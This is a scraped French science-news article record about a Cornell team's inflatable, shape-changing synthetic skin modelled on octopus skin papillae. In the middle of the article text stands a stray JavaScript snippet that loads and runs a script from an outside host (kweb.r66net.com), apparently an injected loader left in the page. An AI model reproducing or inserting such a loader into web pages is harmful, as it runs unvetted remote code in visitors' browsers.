{"title": "Une peau artificielle qui change de forme, inspiree des pieuvres", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-10-23", "content": "Aux Etats-Unis, une equipe de scientifiques s'est inspiree des capacites de camouflage de la pieuvre pour creer une curieuse peau synthetique elastique pouvant changer de forme et de texture. De quoi, affirment ses concepteurs, imaginer des robots capables de se metamorphoser. Ce qu'il faut retenir La pieuvre possede des muscles capables de faire apparaitre une protuberance a la surface de la peau, ameliorant ainsi son camouflage. Des chercheurs ont tente de reproduire cette faculte avec une structure se deformant a volonte lorsqu'on y injecte de l'air. Les pieuvres sont des animaux fascinants, tant par leur  intelligence  que leurs extraordinaires capacites de  camouflage  qui leur permettent de changer la  couleur  et la  texture  de leur peau pour se fondre dans leur milieu naturel, meme au fond d'un  bateau  ! Les scientifiques cherchent depuis longtemps a reproduire ce don pour creer une peau synthetique susceptible de se metamorphoser. Un groupe de chercheurs de l'universite Cornell, de New York, et du Laboratoire de biologie marine du Massachusetts (Etats-Unis) a concu une peau synthetique elastique qui peut changer de forme et de texture. On est encore tres loin des facultes d'une pieuvre, mais la solution techniquement astucieuse pourrait etre appliquee a la  robotique . Pour elaborer cette  peau artificielle  capable de se modeler en 3D, l'equipe emmenee par le professeur Rob Sheperd a etudie le fonctionnement des papilles dermiques de la pieuvre. Ce groupe musculaire contient des muscles erectiles qui, lorsqu'ils se contractent, provoquent une protuberance a la surface de la peau. C'est ainsi qu'en quelques dixiemes de seconde, une pieuvre peut prendre la forme et la couleur d'un element du fond marin sur lequel elle se trouve (voir cette etonnante video sur  YouTube ). Cette video fournit quelques exemples de metamorphoses avec la peau artificielle. Dans l'introduction, le professeur Rob Sheperd explique le principe de fonctionne mecanique assez simple, qu'il illustre avec un ballon cintre d'un fil de fer. (c)  Cornell University Une interface tactile pour la realite virtuelle Pour reproduire ce comportement, le groupe du professeur Sheperd a eu recours a un tissu rigide decoupe au  laser  de maniere a former une sorte de toile qui est ensuite plaquee sur une membrane elastomere. Lorsque la structure est gonflee avec de l' air , des formes vont emerger a certains endroits de la surface selon le motif predecoupe et se combiner pour creer une forme en trois dimensions.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Dans leur article scientifique paru dans la revue  Science , les chercheurs expliquent que la toile rigide peut etre taillee pour induire toutes sortes de structures complexes. Ils pensent que cette peau artificielle transformable pourrait un jour servir sur des  robots , sans toutefois expliquer quelle serait la finalite. Mais ce n'est pas tout. Selon eux, cette structure pourrait servir a fabriquer des meubles metamorphes ou a creer des interfaces tactiles qui permettraient aux utilisateurs de  realite virtuelle  de sentir leur environnement.  Mais pour le moment, le professeur Sheperd et son equipe doivent encore surmonter plusieurs obstacles. A commencer par le fait que leur structure ne peut adopter qu'une seule forme a la fois et ne change pas de couleur. La pieuvre n'est pas prete d'avoir de la concurrence ! Au MIT, les robots ramollissent                       Lorsque l'on pense aux robots, on imagine des organes solides, rivetes les uns aux autres et animes par des moteurs. Mais au MIT, des chercheurs tentent de concevoir des robots qui simulent la flexibilite et l'elasticite d'un etre vivant. Decouvrez en video ces nouveaux membres flexibles qui equiperont peut-etre les robots du futur.                                       ", "theme": "tech"}